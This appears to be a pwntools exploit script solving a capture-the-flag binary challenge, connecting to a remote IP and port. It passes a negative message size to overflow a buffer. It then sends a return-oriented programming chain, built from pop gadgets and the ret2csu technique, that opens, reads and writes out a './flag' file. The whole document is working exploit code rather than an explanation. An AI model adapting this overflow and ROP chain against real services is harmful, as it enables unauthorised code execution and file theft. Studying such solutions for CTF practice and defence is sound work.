from pwn import*
context.log_level = 'DEBUG'
context.arch = 'AMD64'
p = process('./main')
p = remote('39.101.210.214',10013)
elf =ELF('./main')
p.sendlineafter('name: ',"FMYY")
p.sendlineafter('Enter the size of message: ','-1')
pop_rdi_ret = 0x0000000000401A3B
pop_rsi_r15 = 0x0000000000401A39
flag_write = elf.bss() + 0x300
get_name = 0x401523
payload  = '\x00'*0x118
def csu_init(call,rdi,rsi,rdx):
	payload  = p64(0x401A32)
	payload += p64(0)
	payload += p64(1)
	payload += p64(rdi)
	payload += p64(rsi)
	payload += p64(rdx)
	payload += p64(call)
	payload += p64(0x401A18)
	payload += '\x00'*8*7
	return payload
orw  = p64(pop_rdi_ret) + p64(flag_write)
orw += p64(pop_rsi_r15) + p64(0)*2
orw += p64(elf.plt['open'])
orw += csu_init(elf.got['read'] ,3,flag_write,0x50)
orw += csu_init(elf.got['write'],1,flag_write,0x50)
payload += p64(pop_rdi_ret)
payload += p64(flag_write)
payload += p64(pop_rsi_r15)
payload += p64(8)
payload += p64(0)
payload += p64(get_name)
payload += orw
payload  = payload.ljust(0xA00,'\x00')

p.sendafter('message: ',payload + '\n')
#gdb.attach(p,"b *0x401930")
p.sendline('./flag')
p.interactive()
